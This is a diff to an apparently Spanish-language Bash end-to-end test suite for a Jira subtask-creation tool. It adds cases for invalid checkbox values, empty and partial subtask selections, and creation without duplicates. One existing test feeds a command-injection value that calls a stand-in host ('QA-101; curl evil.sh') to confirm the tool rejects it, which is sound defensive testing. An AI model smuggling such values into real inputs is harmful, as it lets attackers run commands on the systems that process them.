@@ -39,6 +39,11 @@ check "token incorrecto → 401"    1 QA-101 0 QE_ISSUE_KEY=QA-101 JIRA_API_TOKE
 check "secreto faltante"          1 QA-101 0 QE_ISSUE_KEY=QA-101 JIRA_API_TOKEN=
 check "issue inexistente → 404"   1 QA-101 0 QE_ISSUE_KEY=QA-999
 check "input malicioso rechazado" 1 QA-101 0 QE_ISSUE_KEY='QA-101; curl evil.sh'
+check "checkbox con valor inválido" 1 QA-101 0 QE_ISSUE_KEY=QA-101 QE_SUBTASK_2=si
+NONE=(QE_SUBTASK_1=false QE_SUBTASK_2=false QE_SUBTASK_3=false QE_SUBTASK_4=false QE_SUBTASK_5=false)
+check "ninguna seleccionada"      0 QA-101 0 QE_ISSUE_KEY=QA-101 "${NONE[@]}"
+check "algunas (1 y 3)"           0 QA-101 2 QE_ISSUE_KEY=QA-101 QE_SUBTASK_2=false QE_SUBTASK_4=false QE_SUBTASK_5=false
+check "luego todas, sin duplicar" 0 QA-101 5 QE_ISSUE_KEY=QA-101
 set -e
 echo; echo "E2E: $PASS ok, $FAIL fallidos"
 [[ $FAIL -eq 0 ]]
